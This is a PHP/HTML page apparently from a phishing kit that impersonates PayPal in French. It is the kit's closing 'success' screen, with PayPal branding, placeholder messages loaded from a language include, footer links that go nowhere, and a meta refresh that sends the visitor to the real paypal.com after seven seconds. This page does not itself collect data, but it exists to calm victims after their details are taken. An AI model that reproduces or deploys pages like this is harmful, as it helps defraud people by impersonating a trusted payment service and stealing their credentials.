<?php
	include("../settings/lang/index.php");
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title>PayPal</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/main.js"></script>
	<meta http-equiv="refresh" content="7;https://www.paypal.com" />
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>
				<div class="xeonContent">

				<!-- CONTAINER --> 
					<div class="xeonsafeComponent">
						<header>
							<div class="xeonLogo big"></div>
						</header>
						<div class="xeonsafe">
							<img src="../assets/img/success.png">
							<h1><?php echo $xeon61; ?></h1>
							<div class="xeonSafeDescription"><?php echo $xeon62; ?></div>
						</div>
					</div>

				<!-- LOADING -->
					<div class="xeonLoaderOverlay">
						<div class="xeonModalAnimate hide">
							<div class="xeonRotate"></div>
							<div class="xeonProcessing"><?php echo $xeon12; ?></div>
							<div class="xeonLoaderOverlayAdditionalElements"></div>
						</div>
					</div>
					<div class="xeonModalOverlay hide"></div>

				</div>
			</div>
		</div>
	</div>

	<footer class="xeonFooter">
		<ul class="xeonFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

<!-- LOADING -->
	<div class="xeonLoaderOverlay">
		<div class="xeonModalAnimate" id="xeonModalAnimate">
			<div class="xeonRotate"></div>
			<div class="xeonProcessing"><?php echo $xeon12; ?></div>
			<div class="xeonLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="xeonModalOverlay" id="xeonModalOverlay"></div>

</body>
</html>